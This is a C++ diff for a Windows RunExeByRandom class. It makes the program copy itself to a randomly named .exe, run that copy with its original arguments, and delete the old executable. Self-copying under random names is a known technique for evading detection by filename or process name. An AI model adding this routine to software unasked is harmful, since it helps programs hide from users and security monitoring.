@@ -12,7 +12,7 @@ RunExeByRandom::RunExeByRandom(LPCSTR lpszOringinName)
 BOOL RunExeByRandom::RandomCopySelf()
 {
 	CToolOper tp ;
-	std::string sRandName = tp.GetTempName("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm",".dat");
+	std::string sRandName = tp.GetTempName("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm",".exe");
 
 	char szPath[MAX_PATH],szAppDir[MAX_PATH];
 	memset(szPath,0,sizeof szPath);
@@ -38,9 +38,9 @@ void RunExeByRandom::RunNewExe(LPCSTR lpszPath,LPCSTR lpszCmd)
 	STARTUPINFOA si={sizeof STARTUPINFOA};
 	PROCESS_INFORMATION pi;
 
-	char szExeCmd[4096]={0};
-	sprintf(szExeCmd,"%s %s",lpszPath,lpszCmd);
-	CreateProcessA(NULL,szExeCmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
+	//char szExeCmd[4096]={0};
+	//sprintf(szExeCmd,"%s %s",lpszPath,lpszCmd);
+	CreateProcessA(lpszPath,(LPSTR)lpszCmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
 }
 
 void RunExeByRandom::DeleteOldExe(LPCSTR lpszPath)
@@ -50,6 +50,8 @@ void RunExeByRandom::DeleteOldExe(LPCSTR lpszPath)
 
 bool RunExeByRandom::Run()
 {
+	if(mOringinName.length()==0) return false;
+
 	CToolOper tp ;
 
 	char szPath[MAX_PATH];
@@ -62,23 +64,28 @@ bool RunExeByRandom::Run()
 
 	pFind +=1;
 
-	if (__argc < 2){
-
-		bool bRand = false;
-		if(mOringinName.length()==0) bRand = true;
-		else if (mOringinName.find(pFind) != -1) bRand = true;
-		if(bRand)
-		{
-			if(RandomCopySelf())
-			{
-				RunNewExe(mRandName.c_str(),szPath);
-			}
-
-			return true;
-		}
+	std::string sCmdLine="";
+	for (int i=0;i<__argc;i++)
+	{
+		sCmdLine += T2AString(__targv[i]);
+		sCmdLine += " ";
 	}
-	
-	if(__argc >= 2 )DeleteOldExe(T2AString(__targv[1]).c_str());
+
+	if(sCmdLine.length()>0) sCmdLine.erase(sCmdLine.length()-1);
+
+	if (stricmp(pFind,mOringinName.c_str()) == 0)
+	{
+		if(RandomCopySelf())
+		{
+			RunNewExe(mRandName.c_str(),sCmdLine.c_str());
+		}
+
+		return true;
+	}
+	else
+	{
+		if(__argc>0) DeleteOldExe(T2AString(__targv[0]).c_str());
+	}
 
 	return false;
 }
